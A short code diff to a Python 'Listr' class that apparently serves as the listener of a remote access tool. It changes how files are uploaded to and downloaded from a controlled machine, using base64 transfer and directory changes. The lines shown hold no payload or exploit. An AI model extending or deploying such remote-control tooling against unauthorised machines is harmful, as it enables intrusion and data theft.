@@ -12,6 +12,7 @@ import time
 import threading
 import shlex
 import re
+import os
 
 class Listr:
 
@@ -60,15 +61,15 @@ class Listr:
         return self.rcve_data()
 
 
-    def w_f(self, path, item):
-        with open(path, "wb") as f:
+    def w_f(self, pathfw, item):
+        with open(pathfw, "wb") as f:
             f.write(base64.b64decode(item))
-            return f'Downloaded at {path}\n'
+            return f'Downloaded at {pathfw}\n'
     
 
-    def r_f(self, path):
+    def r_f(self, pathfr):
         # only r read plain text, with b reads binary. e.g.: open(path, "rb")
-        with open(path, "rb") as f:
+        with open(pathfr, "rb") as f:
             return base64.b64encode(f.read()).decode()
 
 
@@ -307,7 +308,14 @@ class Listr:
 
             # Uploading, the file is appended to comm.
             elif self.comm[0] == "upload":
+                pathfr = self.comm[1] # Saving the path
+                if re.search(r'/', self.comm[1]):
+                    self.comm[1] = self.comm[1].split('/')[-1] # Taking only the file name
+                current_dir = os.getcwd()
+                fl_dir_name = os.path.dirname(os.path.abspath(pathfr)) # Directory file name
+                os.chdir(fl_dir_name)
                 self.comm.append(self.r_f(self.comm[1]))
+                os.chdir(current_dir)
             elif self.comm[0] == "download":
                 wait_dwnl.start()
             result = self.exe_rmy(self.comm)
